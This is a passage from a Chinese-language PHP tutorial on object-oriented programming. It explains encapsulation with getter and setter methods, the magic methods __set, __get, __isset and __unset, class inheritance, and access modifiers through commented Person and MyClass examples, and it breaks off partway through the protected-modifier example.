<h3><span id="私有成员的访问">私有成员的访问</span></h3><p>对象中的成员属性一旦被private关键字封装成私有以后，就只能在对象内部的成员方法中使用。不能被对象外部直接赋值，也不能在对象外部直接获取私有属性的值。如果不让用户在对象外部设置私有属性的值，但可以获取私有属性的值。或者允许用户对私有属性赋值，但需要限制一些赋值的条件。解决方法就是在对象的内部声明一些操作私有属性的方法，再把这个方法通过public关键字设置为共有的访问权限。如果成员方法没有加任何访问控制修饰，默认就是public的，在任何地方都可以访问。这样，在对象外部就可以通过公有的方法作为访问接口，间接地访问对象内部私有成员。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">	class Person  &#123;            //声明一个人类Person，其中包含的三个成员属性被封装起来</span><br><span class="line">		//下面是声明人的成员属性，全都使用了private关键字封装</span><br><span class="line">		private $name;       //第一个成员属性$name定义人的名子，此属性被封装</span><br><span class="line">		private $sex;         //第二个成员属性$sex定义人的性别，此属性被封装</span><br><span class="line">		private $age;         //第三个成员属性$age定义人的年龄，此属性被封装</span><br><span class="line"></span><br><span class="line">		//声明一个构造方法，将来创建对象时，为对象的成员私有属性赋予初值</span><br><span class="line">	    	function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;</span><br><span class="line">			$this-&gt;name = $name;    //使用传入的参数$name为成员属性$this-&gt;name赋初值</span><br><span class="line">			$this-&gt;sex = $sex;       //使用传入的参数$sex为成员属性$this-&gt;sex赋初值</span><br><span class="line">			$this-&gt;age = $age;       //使用传入的参数$age为成员属性$this-&gt;age赋初值</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		public  function getName() &#123;   //通过这个公有方法可以在对象外部获取私有属性$name的值</span><br><span class="line">			return $this-&gt;name;      //返回对象的私有属性的值</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		public function setSex($sex) &#123;  //通过这个公有方法在对象外部为私有属性$sex设置值，但限制条件</span><br><span class="line">			if($sex==&quot;男&quot; || $sex==&quot;女&quot;)   //如果传入合法的值才为私有的属性赋值</span><br><span class="line">				$this-&gt;sex=$sex;        //条成立则将参数传入的值赋给私有属性</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function setAge($age) &#123; //通过这个公有方法在对象外部为私有属性$age设置值，但限制条件</span><br><span class="line">			if($age &gt; 150 || $age &lt;0)      //如果设置不合理的年龄则函数不往下执行</span><br><span class="line">				return;                //返回空值，退出函数</span><br><span class="line">			$this-&gt;age=$age;            //执行此语句则重新为私有属性赋值</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function getAge()&#123;    //通过这个公有方法可以在对象外部获取私有属性$name的值</span><br><span class="line">			if($this-&gt;age &gt; 30)           //如果年龄的成员属性大于30则返回虚假的年龄</span><br><span class="line">				return $this-&gt;age-10;     //返回当前的年龄减去10岁</span><br><span class="line">			else                       //如果年龄在30岁以下则返回真实年龄</span><br><span class="line">				return $this-&gt;age;       //返回当前的私有年龄属</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//下面是声明人的成员公有方法，说出自己所有的私有属性</span><br><span class="line">		function say()&#123;   //在类中声明说话的方法，使用$this访问自已对象内部的成员属性</span><br><span class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot;， 性别：&quot;.$this-&gt;sex.&quot;， 我的年龄是：&quot;.$this-&gt;age.&quot;。&lt;br&gt;&quot;;</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$person1=new Person(&quot;王五&quot;, &quot;男&quot;, 40);  //创建对象$person1</span><br><span class="line">	echo $person1-&gt;getName().&quot;&lt;br&gt;&quot;;      //访问对象中的公有方法，获取对象中私有属性$name输出</span><br><span class="line">	$person1-&gt;setSex(&quot;女&quot;);               //通过公有的方法为私有属性$sex设置合法的值</span><br><span class="line">	$person1-&gt;setAge(200);               //通过公有的方法为私有属性$age设置非法的值，赋值失败</span><br><span class="line">	echo $person1-&gt;getAge().&quot;&lt;br&gt;&quot;;       //访问对象中的公有方法，获取对象中私有属性$age输出</span><br><span class="line">	$person1-&gt;say();                    //访问对象中的公有方法，获取对象中所有的私有属性并输出</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="set-get-isset和unset四种方法"><strong>set()、</strong>get()、<strong>isset()和</strong>unset()四种方法</span></h3><p>在PHP5.1.0以后的版本中，预定义了两个方法“get()”和“set()”，用来完成对所有私有属性都能获取和赋值的操作，以及用来检查私有属性是否存在的方法“isset”和用来删除对象中私有属性的方法“unset()”.(以两个下划线开始)</p>
<h4><span id="魔术方法__set">魔术方法__set()</span></h4><p>类中声明格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void __set(string name,mixed value)     //是以两个下划线开始的方法名，方法体的内容需要自定义</span><br></pre></td></tr></table></figure></p>
<p>该方法的作用是在程序运行过程中为私有的成员属性设置值，它不需要有任何返回值。但它需要两个参数，第一个参数需要传入在为私有属性设置值时的属性名，第二个参数则需要传入为属性设置的值。而且这个方法不需要我们主动调用，可以在方法前面也加上private关键字修饰，防止用户直接去调用它。这个方法是在用户值为私用属性设置值时自动调用的。如果不在类中添加这个方法而直接为私有属性赋值，则会出现“不能访问某个私有属性”的错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Person  &#123;            //声明一个人类Person，其中包含的三个成员属性被封装起来</span><br><span class="line">		//下面是声明人的成员属性，全都使用了private关键字封装</span><br><span class="line">		private $name;       //第一个成员属性$name定义人的名子，此属性被封装</span><br><span class="line">		private $sex;         //第二个成员属性$sex定义人的性别，此属性被封装</span><br><span class="line">		private $age;         //第三个成员属性$age定义人的年龄，此属性被封装</span><br><span class="line"></span><br><span class="line">		//声明一个构造方法，将来创建对象时，为对象的成员属性赋予初值</span><br><span class="line">	    	function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;</span><br><span class="line">			$this-&gt;name = $name;    //使用传入的参数$name为成员属性$this-&gt;name赋初值</span><br><span class="line">			$this-&gt;sex = $sex;       //使用传入的参数$sex为成员属性$this-&gt;sex赋初值</span><br><span class="line">			$this-&gt;age = $age;       //使用传入的参数$age为成员属性$this-&gt;age赋初值</span><br><span class="line">		&#125;</span><br><span class="line">		//声明魔术方法需要两个参数，真接为私有属性赋值时自动调用，并可以屏蔽一些非法赋值</span><br><span class="line">		private function __set($propertyName, $propertyValue) &#123; </span><br><span class="line">			if($propertyName==&quot;sex&quot;)&#123;        //如果第一个参数是属性名sex则条件成立</span><br><span class="line">				if(!($propertyValue == &quot;男&quot; || $propertyValue == &quot;女&quot;))  //第二个参数只能是男或女</span><br><span class="line">					return;                //如果是非法参数返回空，则结束方法执行</span><br><span class="line">			&#125;	</span><br><span class="line"></span><br><span class="line">			if($propertyName==&quot;age&quot;)&#123;        //如果第一个参数是属性名age则条件成立</span><br><span class="line">				if($propertyValue &gt; 150 || $propertyValue &lt;0)  //第二个参数只能在0到150之间的整数</span><br><span class="line">					return;                //如果是非法参数返回空，则结束方法执行</span><br><span class="line">			&#125;</span><br><span class="line">              //根据参数决定为那个属性被赋值，传入不同的成员属性名，赋上传入的相应的值</span><br><span class="line">			$this-&gt;$propertyName = $propertyValue; </span><br><span class="line">		&#125; </span><br><span class="line">		</span><br><span class="line">		//下面是声明人类的成员方法,设置为公有的可以在任何地方访问</span><br><span class="line">		public function say()&#123; //在类中声明说话的方法，将所有的私有属性说出</span><br><span class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot;， 性别：&quot;.$this-&gt;sex.&quot;， 我的年龄是：&quot;.$this-&gt;age.&quot;。&lt;br&gt;&quot;;</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$person1=new Person(&quot;张三&quot;, &quot;男&quot;, 20); </span><br><span class="line">	//自动调用了__set()函数，将属性名name传给第一个参数，将属性值”李四”传给第二个参数</span><br><span class="line">	$person1-&gt;name=&quot;李四&quot;;     //赋值成功</span><br><span class="line">	//自动调用了__set()函数，将属性名sex传给第一个参数，将属性值”女”传给第二个参数</span><br><span class="line">	$person1-&gt;sex=&quot;女&quot;;         //赋值成功</span><br><span class="line">   	//自动调用了__set()函数，将属性名age传给第一个参数，将属性值80传给第二个参数</span><br><span class="line">	$person1-&gt;age=80;          //赋值成功</span><br><span class="line">	</span><br><span class="line">	$person1-&gt;sex=&quot;保密&quot;;       //“保密”是一个非法值，这条语句给私有属性sex赋值失败</span><br><span class="line">	$person1-&gt;age=800;         //800是一个非法值，这条语句私有属生age赋值失败</span><br><span class="line"></span><br><span class="line">	$person1-&gt;say();	           //调用$person1对象中的say()方法，查看一下所有被重新设置的新值</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="魔法方法__get">魔法方法__get()</span></h4><p>在类中声明的格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed __get(string name)</span><br></pre></td></tr></table></figure></p>
<p>该方法的作用是在程序运行过程中，通过它可以在对象的外部获取私有成员后苏醒的值。它有一个必选的参数，需要传入在获取私有属性值时的属性名，并返回一个值，是在这个方法处理后的允许对象外部使用的值。而且这个方法也不需要我们主动调用，也可以在方法前面加上private关键字修饰，防止用户直接去调用它。如果不在类中添加这个方法而直接获取私有属性的值，也会出现”不能访问某个私有属性”的错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Person  &#123;            //声明一个人类Person，其中包含的三个成员属性被封装起来</span><br><span class="line">		//下面是声明人的成员属性，全都使用了private关键字封装</span><br><span class="line">		private $name;       //第一个成员属性$name定义人的名子，此属性被封装</span><br><span class="line">		private $sex;         //第二个成员属性$sex定义人的性别，此属性被封装</span><br><span class="line">		private $age;         //第三个成员属性$age定义人的年龄，此属性被封装</span><br><span class="line"></span><br><span class="line">		//声明一个构造方法，将来创建对象时，为对象的成员属性赋予初值</span><br><span class="line">	    	function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;     //使用了默认参数</span><br><span class="line">			$this-&gt;name = $name;    //使用传入的参数$name为成员属性$this-&gt;name赋初值</span><br><span class="line">			$this-&gt;sex = $sex;       //使用传入的参数$sex为成员属性$this-&gt;sex赋初值</span><br><span class="line">			$this-&gt;age = $age;       //使用传入的参数$age为成员属性$this-&gt;age赋初值</span><br><span class="line">		&#125;</span><br><span class="line">		//在类中添加__get()方法，在直接获取属性值时自动调用一次，以属性名作为参数传入并处理</span><br><span class="line">		private function __get($propertyName)  &#123;    //在方法前使用private修饰，防止对象外部调用 </span><br><span class="line">			 if($propertyName==&quot;sex&quot;) &#123;          //如果参数传入的是”sex”则条件成立</span><br><span class="line">				return &quot;保密&quot;;                  //不让别人获取到性别，以“保密”替代</span><br><span class="line">			 &#125; else  if($propertyName==&quot;age&quot;) &#123;    //如果参数传入的是“age”则条件成立</span><br><span class="line">				if($this-&gt;age &gt; 30)               //如果对象中的年龄大于30时条件成立</span><br><span class="line">					return $this-&gt;age-10;	       //返回对象中虚假的年龄，比真实年龄小10岁</span><br><span class="line">				else                           //如果对象中的年龄不大于30时则执行下面代码</span><br><span class="line">					return $this-&gt;$propertyName;  //让访问都可以获取到对象中真实的年龄</span><br><span class="line">			 &#125; else &#123;                            //如果参数传入的是其它属性名则条件成立</span><br><span class="line">			 	return $this-&gt;$propertyName;      //对其它属性都没有限制，可以直接返回属性的值</span><br><span class="line">			 &#125; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$person1=new Person(&quot;张三&quot;, &quot;男&quot;, 40);   //通过Person类实例化的对象，并通过构造方法为属性赋初值</span><br><span class="line">	</span><br><span class="line">	echo &quot;姓名：&quot;.$person1-&gt;name.&quot;&lt;br&gt;&quot;;   //直接访问私有属性name，自动调用了__get()方法可以间接获取</span><br><span class="line">	echo &quot;性别：&quot;.$person1-&gt;sex.&quot;&lt;br&gt;&quot;;    //自动调用了__get()方法，但在方法中没有返回真实属性值</span><br><span class="line">	echo &quot;年龄：&quot;.$person1-&gt;age.&quot;&lt;br&gt;&quot;;    //自动调用了__get()方法，根据对象本身的情况会返回不同的值</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="魔法方法isset和unset">魔法方法<strong>isset()和</strong>unset()</span></h4><p>isset()函数是用来测定变量是否存在的函数。传入一个变量作为参数，如果传入的变量存在则传回true,否则传回false。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool __isset(string name)    //传入对象中的成员属性名作为参数，返回测定后的结果</span><br></pre></td></tr></table></figure>
<p>unset()的作用是删除指定的变量，参数为要删除的变量名称。也可以使用这个函数在对象外部删除对象中的成员属性，但这个对象中的成员属性必须是公有的才可以直接删除。如果对象中的成员属性被封装，就需要在类中添加“unset()”方法，才可以在对象的外部使用“unset()”方法帮助我们间接地将私有的成员属性删除。也可以在“unset()”方法中限制一些条件，删除一些重要的属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void __unset(string name)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">	class Person  &#123;           	 //声明一个人类Person，其中包含的三个成员属性被封装起来</span><br><span class="line">		//下面是声明人的成员属性，全都使用了private关键字封装</span><br><span class="line">		private $name;      	 //第一个成员属性$name定义人的名子，此属性被封装</span><br><span class="line">		private $sex;        	 //第二个成员属性$sex定义人的性别，此属性被封装</span><br><span class="line">		private $age;         	//第三个成员属性$age定义人的年龄，此属性被封装</span><br><span class="line"></span><br><span class="line">		//声明一个构造方法，将来创建对象时，为对象的成员属性赋予初值</span><br><span class="line">	    	function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;</span><br><span class="line">			$this-&gt;name = $name;  	  	//使用传入的参数$name为成员属性$this-&gt;name赋初值</span><br><span class="line">			$this-&gt;sex = $sex;      	 //使用传入的参数$sex为成员属性$this-&gt;sex赋初值</span><br><span class="line">			$this-&gt;age = $age;      	 //使用传入的参数$age为成员属性$this-&gt;age赋初值</span><br><span class="line">		&#125;</span><br><span class="line">	     	//当在对象外面使用isset()测定私用成员属性时，自动调用，并在内部测定扣传给外部的isset()结果</span><br><span class="line">		private function __isset($propertyName) &#123;   //需要一个参数，是测定的私有属性的名称</span><br><span class="line">			if($propertyName==&quot;name&quot;)         	//如果参数中传入的属性名等于”name’时条件成立</span><br><span class="line">				return false;                  //返回假，不充许在对象外部测定这个属性</span><br><span class="line">			return isset($this-&gt;$propertyName);   //其它的属性都可以被测定，并返回测定的结果</span><br><span class="line">   		&#125;</span><br><span class="line">         	//当在对象外面使用unset()方法删除私用属性时，自动被调用，并在内部把私用的成员属性删除</span><br><span class="line">   		private function __unset($propertyName) &#123;   //需要一个参数，是要删除的私有属性名称</span><br><span class="line">			if($propertyName==&quot;name&quot;)          //如果参数中传入的属性名等于”name”时条件成立</span><br><span class="line">				return;                       //退出方法，不充许删除对象中的name属性</span><br><span class="line">			unset($this-&gt;$propertyName);         //在对象的内部删除在对象外指定的私有属性</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public function say()  //在类中声明说话的方法，将所有的私有属性说出</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot;， 性别：&quot;.$this-&gt;sex.&quot;， 我的年龄是：&quot;.$this-&gt;age.&quot;。&lt;br&gt;&quot;;</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$person1=new Person(&quot;张三&quot;, &quot;男&quot;, 40);   //创建一个对象$person1，将成员属性分别赋上初值</span><br><span class="line">	</span><br><span class="line">	var_dump(isset($person1-&gt;name));        //输出bool(false)，不充许测定对象是否存在name属性</span><br><span class="line">	var_dump(isset($person1-&gt;sex));          //输出bool(true)，使用isset()测定对象中存在sex私有属性</span><br><span class="line">	var_dump(isset($person1-&gt;age));          //输出bool(true)，使用isset()测定对象中存在age私有属性</span><br><span class="line">	var_dump(isset($person1-&gt;id));           //输出bool(false)，使用isset()测定对象中不存在id属性</span><br><span class="line">	</span><br><span class="line">	unset($person1-&gt;name);                //删除对象中的私有属性name，但在__unset()中不充许删除</span><br><span class="line">	unset($person1-&gt;sex);                  //删除对象中的私有属性sex，删除成功</span><br><span class="line">	unset($person1-&gt;age);                  //删除对象中的私有属性age，删除成功</span><br><span class="line">	</span><br><span class="line">	$person1-&gt;say();  //对象中的sex和age属性被删除，输出：我的名子叫：张三， 性别：， 我的年龄是：。</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="继承性">继承性</span></h2><h3><span id="类继承的应用">类继承的应用</span></h3><p>使用“extends”关键字实现多个类的单继承关系<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Person &#123;           //声明一个人类，定义人所具有的一些其本的属性和功能成员，做为父类 </span><br><span class="line">		var $name;         //声明一个存储人的名子的成员</span><br><span class="line">		var $sex;           //声明一个存储人的性别的成员</span><br><span class="line">		var $age;           //声明一个存储人的年龄的成员</span><br><span class="line">		</span><br><span class="line">	    	function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;    //构造方法用来创建对象并初使化成员属性</span><br><span class="line">			$this-&gt;name = $name;           //为成员属性name在创建对象时赋初值</span><br><span class="line">			$this-&gt;sex = $sex;              //为成员属性sex在创建对象时赋初值</span><br><span class="line">			$this-&gt;age = $age;              //为成员属性age在创建对象时赋初值</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		function say()&#123;           //在人类在声明一个通用的说话方法，介绍一下自己</span><br><span class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot;， 性别：&quot;.$this-&gt;sex.&quot;， 我的年龄是：&quot;.$this-&gt;age.&quot;。&lt;br&gt;&quot;;</span><br><span class="line">		&#125;	</span><br><span class="line">		</span><br><span class="line">		function run() &#123;          //在人类是声明一个人的通用的走路方法</span><br><span class="line">			echo $this-&gt;name.&quot;正在走路。&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	class Student extends Person &#123;   //声明一个学生类，使用extends关键字扩展（继承）Person类</span><br><span class="line">		var $school;             //在学生类中声明一个所在学校school的成员属性</span><br><span class="line">		</span><br><span class="line">		function study() &#123;        //在学生类中声明一个学生可以学习的方法</span><br><span class="line">			echo $this-&gt;name.&quot;正在&quot;.$this-&gt;school.&quot;学习&lt;br&gt;&quot;;</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	class Teacher extends Student &#123;  //再声明一个教师类，使用extends关键字扩展（继承）Student类</span><br><span class="line">		var $wage;              //在教师类中声明一个教师工资wage的成员属性</span><br><span class="line">		</span><br><span class="line">		function teaching() &#123;      //在教师类中声明一个教师可以教学的方法</span><br><span class="line">			echo $this-&gt;name.&quot;正在&quot;.$this-&gt;school.&quot;教学,每月工资为&quot;.$this-&gt;wage.&quot;。&lt;br&gt;&quot;;	</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$teacher1=new Teacher(&quot;张三&quot;, &quot;男&quot;, 40);   //使用继承过来的构造方法创建一个教师对象</span><br><span class="line">	</span><br><span class="line">	$teacher1-&gt;school=&quot;edu&quot;;        //将一个教师对象中的所在学校的成员属性school赋值</span><br><span class="line">	$teacher1-&gt;wage=3000;         //将一个教师对象中的成员属性工资赋值</span><br><span class="line"></span><br><span class="line">	$teacher1-&gt;say();              //调用教师对象中的说话方法</span><br><span class="line">	$teacher1-&gt;study();            //调用教师对象中的学习方法</span><br><span class="line">	$teacher1-&gt;teaching();          //调用教师对象中的教学方法</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="访问类型控制">访问类型控制</span></h3><p>PHP5支持如下三种访问修饰符，包括public、private和protected三种</p>
<h4><span id="公有的访问修饰符public">公有的访问修饰符public</span></h4><p>类中的成员将没有访问限制，所有的外部成员都可以访问这个类中的成员，在PHP 5之前的所有版本中，PHP中类的成员都是public的，而且在PHP5中如果类的成员没有指定成员访问修饰符，将被视为public。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var $property			//声明成员属性时，没有使用访问控制的修饰符，默认就是public的成员</span><br><span class="line">public $property			//使用public修饰符，控制此成员属性为公有的</span><br><span class="line">function fun()&#123;...&#125;			//声明成员方法时，没有使用访问控制的修饰符，默认就是public的成员</span><br><span class="line">public function fun()&#123;...&#125;			//使用public修饰符，控制此成员方法为公有的</span><br></pre></td></tr></table></figure></p>
<h4><span id="私有的访问修饰符private">私有的访问修饰符private</span></h4><p>当类中的成员被定义为private，对于同一类里的所有成员都没有访问限制，但对于该类的外部代码是不允许改变甚至操作的，对于该类的子类，也不能访问private修饰的成员。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class MyClass &#123;                     //声明一个类作为父类使用，将它的成员都声明为私有的</span><br><span class="line">		private $var1=100;              //声明一个私有的成员属性并给初值为100</span><br><span class="line"></span><br><span class="line">		private function printHello() &#123;    //声明一个成员方法使用private关键字设置为私有的</span><br><span class="line">			echo &quot;hello&lt;br&gt;&quot;;         //在方法中只有一条输出语句作为测试使用</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	class MyClass2 extends MyClass &#123;     //声明一个MyClass类的子类试图访问父类中的私有成员</span><br><span class="line">		function useProperty()          //在类中声明一个公有方法，访问父类中的私有成员</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;输出从父类继承过来的成员属性值&quot;.$this-&gt;var1.&quot;&lt;br&gt;&quot;;    //访问父类中的私有属性</span><br><span class="line">			$this-&gt;printHello();                                         //访问父类中的私有方法</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$subObj=new MyClass2();          //初例化出子类对象</span><br><span class="line">	$subObj-&gt;useProperty();            //调用子类对象中的方法实现对父类私有成员的访问</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="保护的访问修饰符protected">保护的访问修饰符protected</span></h4><p>被修饰为protected的成员，对于该类的子类以及子类都有访问权限，可以进行属性、方法的读及写操作。但不能被该类的外部代码访问，以及该子类的外部代码也不具有访问其属性和方法的权限。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class MyClass &#123;                      //声明一个类作为父类使用，将它的成员都声明为保护的</span><br><span class="line">		protected $var1=100;             //声明一个保护的成员属性并给初值为100</span><br><span class="line"></span><br><span class="line">		protected function printHello() &#123;    //声明一个成员方法使用protected关键字设置为保护的</span><br><span class="line">			echo &quot;hello&lt;br&gt;&quot;;           //在方法中只有一条输出语句作为测试使用</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	class MyClass2 extends MyClass &#123;     //声明一个MyClass类的子类试图访问父类中的保护成员</span><br><span class="line">		function useProperty()          //在类中声明一个公有方法，访问父类中的保护成员</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;输出从父类继承过来的成员属性值&quot;.$this-&gt;var1.&quot;&lt;br&gt;&quot;;   //访问父类中受保护的属性</span><br><span class="line">			